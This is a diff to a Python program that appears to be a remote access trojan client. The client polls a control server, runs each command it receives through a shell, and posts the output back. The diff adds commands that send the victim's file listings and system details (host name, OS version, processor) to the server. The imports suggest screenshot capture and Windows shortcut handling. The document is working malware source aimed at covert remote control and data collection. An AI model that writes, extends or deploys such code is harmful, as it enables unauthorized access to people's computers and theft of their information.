@@ -6,7 +6,9 @@ from datetime import datetime
 from win32com.client import Dispatch
 import pyautogui
 import tempfile
+import platform
 import shutil
+from math import ceil
 
 save = tempfile.mkdtemp("screen")
 SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
@@ -101,9 +103,28 @@ while True:
                     else:
                         r = requests.post(SERVER_IP_ADDRESS, data= "The file does not exist")
             
-            elif "dir" == response:
-                list_of_files = "\n".join(os.listdir())
+            elif "ls" == response.lower().strip():
+                all_files = []
+                for i in os.scandir():
+                    date_time_stamp = datetime.fromtimestamp(i.stat().st_mtime).strftime('%d-%m-%Y %H:%M')
+                    if os.path.isdir(i):
+                        all_files.append("{:<80} {}".format(i.name+"/", date_time_stamp))
+                    else:
+                        size = str(ceil(i.stat().st_size/1024))+" KB"
+                        all_files.append("{:<80} {} {:>15}".format(i.name, date_time_stamp, size))
+                list_of_files = "\n".join(all_files)
                 r = requests.post(SERVER_IP_ADDRESS, data= list_of_files)
+
+            elif 'system specs' == response.lower().strip():
+                system_specs = 'System      : {}\nNode        : {}\nRelease     : {}\nVersion     : {}\n'\
+                    'Machine     : {}\nProcessor   : {}\nInterpreter : {}'    
+                system_specs = system_specs.format(
+                                        platform.system(), platform.node(),
+                                        platform.release(), platform.version(),
+                                        platform.machine(), platform.processor(),
+                                        platform.architecture()[0]
+                                        )
+                r = requests.post(SERVER_IP_ADDRESS, data= system_specs)
 
             else:
                 CMD =  subprocess.Popen(response,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
